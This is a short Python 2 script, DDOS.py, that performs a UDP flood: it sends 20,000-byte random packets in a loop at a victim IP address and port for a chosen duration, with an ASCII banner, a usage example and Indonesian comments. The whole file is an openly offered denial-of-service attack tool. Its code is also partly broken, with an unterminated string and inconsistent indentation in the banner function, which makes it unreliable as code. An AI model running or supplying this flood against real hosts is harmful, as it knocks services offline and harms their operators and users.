DDOS.py
# -*- coding: utf-8 -*-
# Author : anonymous_ID
# All copyrights to Anonm Independent 2021

import time
import socket
import random
import sys
def usage():
 
      print "▗▄▄  ▗▄▄   ▗▄▖  ▗▄▖        ▄  ▗▄▄▄▖▗▄▄▄▖  ▄    ▄▄ ▗▖ ▄ "
     print "▐▛▀█ ▐▛▀█  █▀█ ▗▛▀▜       ▐█▌ ▝▀█▀▘▝▀█▀▘ ▐█▌  █▀▀▌▐▌▐▛"
     print "▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▙         ▐█▌   █    █   ▐█▌ ▐▛   ▐▙█"
     print "▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌ ▜█▙       █ █   █    █   █ █ ▐▌   ▐██"
     print "▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌   ▜▌ ██▌  ███   █    █   ███ ▐▙   ▐▌▐▙"
     print "▐▙▄█ ▐▙▄█  █▄█ ▐▄▄▟▘     ▗█ █▖  █    █  ▗█ █▖ █▄▄▌▐▌ █"
     print "▝▀▀  ▝▀▀   ▝▀▘  ▀▀▘      ▝▘ ▝▘  ▀    ▀  ▝▘ ▝▘  ▀▀ ▝▘ ▝
     print "───────────────────────────────────────────────────────────"
     print "───────────────────────────────────────────────────────────"
     print "     command  : python2 DDOS.py 192.168.1.1 8080 100"

def flood(victim, vport, duration):
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91m🌐 Processing.. \033[1;32m%s \033[1;91mAttack \033[1;32m%s \033[1;91mDDoS \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
